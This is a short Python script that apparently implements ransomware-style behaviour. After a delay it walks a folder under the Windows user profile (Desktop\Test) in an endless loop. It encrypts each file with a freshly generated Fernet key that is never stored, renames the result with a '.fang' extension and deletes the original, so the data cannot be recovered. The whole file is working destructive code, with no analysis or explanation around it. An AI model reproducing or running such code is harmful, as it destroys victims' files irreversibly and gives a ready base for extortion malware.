import os
from cryptography.fernet import Fernet
import time
import subprocess

def getListOfFiles(dirName):
    # Generate a symmetric Fernet key
    key = Fernet.generate_key()
    f = Fernet(key)
    
    while True:
        time.sleep(1)
        # Look for all files in directory and subdirectories
        filelist = os.walk(dirName)
        for root, dirn, filen in filelist:
            for files in filen:
                fpath = os.path.join(root, files)
                
                # Check if file is already encrypted
                extcheck = files.split(".")
                print(extcheck)

                # File is not encrypted
                if extcheck[-1] != "fang":
                    encpath = os.path.join(root, str(files + ".fang"))
                    # Read and encrypt file
                    with open(fpath, "rb") as rawfile:
                        filedata = rawfile.read()
                    encdata = f.encrypt(filedata)
                    with open(encpath, "wb") as encfile:
                        encfile.write(encdata)
                    print(f"ENCRYPTED: {fpath}")
                    print("Encrypting next file in 2 seconds")
                    # Delete the original file
                    try:
                        os.remove(fpath)
                    except Exception as err:
                        print(err)
                        pass
                    time.sleep(1)
                    
                # File is already encrypted
                else:
                    print("File already encrypted: ", fpath)


if __name__ == '__main__':
    time.sleep(25)
    # Get current user profile
    user = subprocess.Popen("echo %USERPROFILE%", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, shell=True, text=True)
    userprofile = user.stdout.read()
    
    # Specify target directory to recursively encrypt files
    a = str(userprofile.strip() + "\\Desktop\\Test")

    # Run encryption
    getListOfFiles(a)
